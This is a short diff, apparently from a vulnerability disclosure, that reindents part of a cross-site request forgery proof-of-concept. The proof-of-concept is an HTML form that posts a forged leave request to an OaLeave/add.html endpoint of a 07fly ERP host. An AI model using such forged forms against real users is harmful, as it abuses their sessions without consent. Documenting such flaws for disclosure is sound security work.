@@ -10,9 +10,9 @@ POC:
   <script>history.pushState('', '', '/')</script>
     <form action="http://erp.07fly.net:80/oa/OaLeave/add.html" method="POST">
       <input type="hidden" name="type" value="1" />
-<input type="hidden" name="start_time" value="2024-10-17+21%3A06%3A00" />
-<input type="hidden" name="end_time" value="" />
-<input type="hidden" name="reason" value="cs" />
+      <input type="hidden" name="start_time" value="2024-10-17+21%3A06%3A00" />
+      <input type="hidden" name="end_time" value="" />
+      <input type="hidden" name="reason" value="cs" />
 
       <input type="submit" value="Submit request" />
     </form>
